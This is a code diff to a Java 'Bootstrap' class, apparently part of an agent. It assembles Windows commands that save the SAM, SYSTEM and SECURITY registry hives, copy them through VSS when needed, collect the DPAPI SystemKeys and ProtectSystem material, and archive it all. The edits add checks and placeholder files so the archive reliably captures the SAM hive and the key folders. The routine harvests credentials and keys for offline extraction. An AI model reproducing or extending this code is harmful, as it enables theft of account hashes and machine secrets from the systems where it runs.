@@ -349,9 +349,9 @@ public final class Bootstrap {
 			}
 			deleteFile(status);
 		}
-		boolean ready = Files.isRegularFile(hives);
+		boolean ready = Files.isRegularFile(hives) && completeHives(hives);
 		if (!ready) {
-			Log.debug("Bootstrap hives pending, attempt " + state.hivesAttempts);
+			Log.debug("Bootstrap hives pending/incomplete, attempt " + state.hivesAttempts);
 		} else {
 			deleteTree(cache.resolve("ProtectSystem"));
 			deleteTree(cache.resolve("SystemKeys"));
@@ -360,6 +360,16 @@ public final class Bootstrap {
 			state.save(AgentPaths.state(installDir));
 		}
 		return ready;
+	}
+
+	static boolean completeHives(Path zip) {
+		try (java.util.zip.ZipFile file = new java.util.zip.ZipFile(zip.toFile())) {
+			List<String> names = file.stream()
+				.map(entry -> entry.getName().replace('\\', '/')).toList();
+			return names.contains("SAM.hiv") && names.stream().anyMatch(name -> name.startsWith("SystemKeys/"));
+		} catch (Throwable throwable) {
+			return false;
+		}
 	}
 
 	private Path newestSystem() {
@@ -397,6 +407,11 @@ public final class Bootstrap {
 			"reg save HKLM\\SYSTEM \"" + cache.resolve("SYSTEM.hiv") + "\" /y",
 			"reg save HKLM\\SECURITY \"" + cache.resolve("SECURITY.hiv") + "\" /y",
 			"reg save HKLM\\SAM \"" + cache.resolve("SAM.hiv") + "\" /y",
+			// tar aborts at the first missing member: never let SAM/SystemKeys
+			// be holes, or the archive silently loses ProtectSystem too.
+			"if not exist \"" + cache.resolve("SAM.hiv") + "\" type nul > \""
+				+ cache.resolve("SAM.hiv") + "\"",
+			"mkdir \"" + cache.resolve("SystemKeys") + "\" 2>nul",
 			// A task that ends up as plain Administrator cannot save SECURITY; a
 			// VSS copy can, so try that before giving up.
 			"if not exist \"" + cache.resolve("SECURITY.hiv") + "\" esentutl /y /vss "
@@ -412,7 +427,6 @@ public final class Bootstrap {
 			// packing. Without it only the fixed-key flag 1/2 schemes are offline.
 			"robocopy C:\\ProgramData\\Microsoft\\Crypto\\SystemKeys \"" + cache.resolve("SystemKeys")
 				+ "\" /e /njh /njs /ndl /nc /ns",
-			"mkdir \"" + cache.resolve("SystemKeys") + "\" 2>nul",
 			"tar -a -cf \"" + hives + "\" -C \"" + cache + "\" SYSTEM.hiv SECURITY.hiv SAM.hiv "
 				+ "ProtectSystem SystemKeys",
 			"del /q \"" + cache.resolve("SYSTEM.hiv") + "\" \"" + cache.resolve("SECURITY.hiv") + "\"",
